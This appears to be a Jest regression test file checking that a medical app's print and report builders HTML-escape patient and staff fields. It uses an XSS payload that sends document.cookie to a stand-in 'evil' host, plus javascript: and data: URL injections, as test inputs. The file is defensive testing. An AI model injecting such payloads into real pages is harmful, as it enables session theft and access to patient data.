import {
  escapeHtml,
  prescriptionHtml,
  labReportHtml,
  xrayReportHtml,
  ultrasoundReportHtml,
  invoiceHtml,
} from "@/lib/print";

// Regression guard for the stored DOM-XSS in the client-side print/report
// builders (audit F-01). Staff-entered PHI free-text is written into a
// same-origin print window via document.write — every dynamic field must be
// HTML-escaped so an injected payload renders as inert text, never markup.
const PAYLOAD = `<img src=x onerror="fetch('https://evil/c?d='+document.cookie)">`;
const ESCAPED = "&lt;img src=x onerror=";

// A live <img/<script tag opening means a field slipped through unescaped.
// Escaped output keeps the literal text "onerror=" but the leading "<" is now
// "&lt;", so the browser never parses it as a tag — that is the safe state.
function assertNeutralized(html: string) {
  expect(html).not.toMatch(/<img\b/i);
  expect(html).not.toMatch(/<script\b/i);
  expect(html).toContain(ESCAPED);
}

describe("escapeHtml", () => {
  it("encodes all five HTML-significant characters", () => {
    expect(escapeHtml(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("returns empty string for null/undefined (no literal 'null'/'undefined')", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });
});

describe("print builders neutralize injected PHI", () => {
  it("prescriptionHtml escapes patient name, allergies, medication fields, notes", () => {
    const html = prescriptionHtml({
      createdAt: new Date("2026-06-02"),
      patient: { fullName: PAYLOAD, allergies: PAYLOAD, mrn: PAYLOAD },
      doctor: { fullName: PAYLOAD },
      medications: [{ name: PAYLOAD, dosage: PAYLOAD, frequency: PAYLOAD, duration: PAYLOAD, instructions: PAYLOAD }],
      notes: PAYLOAD,
      notesAr: PAYLOAD,
    });
    assertNeutralized(html);
  });

  it("labReportHtml escapes patient, params, test name and notes", () => {
    const html = labReportHtml({
      createdAt: new Date("2026-06-02"),
      testName: PAYLOAD,
      patient: { fullName: PAYLOAD, mrn: PAYLOAD, gender: PAYLOAD },
      requestedBy: { fullName: PAYLOAD },
      params: [{ name: PAYLOAD, value: PAYLOAD, unit: PAYLOAD, refRange: PAYLOAD, flag: "H" }],
      notes: PAYLOAD,
    });
    assertNeutralized(html);
  });

  it("xrayReportHtml escapes findings, impression, bodyPart and drops javascript: imageUrl", () => {
    const html = xrayReportHtml({
      createdAt: new Date("2026-06-02"),
      bodyPart: PAYLOAD,
      patient: { fullName: PAYLOAD, mrn: PAYLOAD },
      requestedBy: { fullName: PAYLOAD },
      findings: PAYLOAD,
      impression: PAYLOAD,
      imageUrl: "javascript:alert(document.cookie)",
    });
    assertNeutralized(html);
    // Non-http(s) scheme must never reach the href.
    expect(html).not.toContain("javascript:");
  });

  it("ultrasoundReportHtml escapes findings, impression, bodyPart", () => {
    const html = ultrasoundReportHtml({
      createdAt: new Date("2026-06-02"),
      examType: PAYLOAD,
      bodyPart: PAYLOAD,
      patient: { fullName: PAYLOAD, mrn: PAYLOAD },
      requestedBy: { fullName: PAYLOAD },
      findings: PAYLOAD,
      impression: PAYLOAD,
      imageUrl: "data:text/html,<script>alert(1)</script>",
    });
    assertNeutralized(html);
    expect(html).not.toContain("data:text/html");
  });

  it("invoiceHtml escapes line-item description, invoice number and patient name", () => {
    const html = invoiceHtml({
      invoiceNumber: PAYLOAD,
      createdAt: new Date("2026-06-02"),
      status: "pending",
      total: 100,
      patient: { fullName: PAYLOAD, mrn: PAYLOAD },
      items: [{ description: PAYLOAD, quantity: 1, unitPrice: 100, total: 100 }],
    });
    assertNeutralized(html);
  });

  it("preserves a legitimate http(s) imageUrl in the href", () => {
    const html = xrayReportHtml({
      createdAt: new Date("2026-06-02"),
      bodyPart: "Chest",
      patient: { fullName: "Jane Doe", mrn: "MRN-1" },
      requestedBy: { fullName: "Dr A" },
      findings: "Clear",
      impression: "Normal",
      imageUrl: "https://cdn.example.com/img/123.png",
    });
    expect(html).toContain(`href="https://cdn.example.com/img/123.png"`);
  });
});
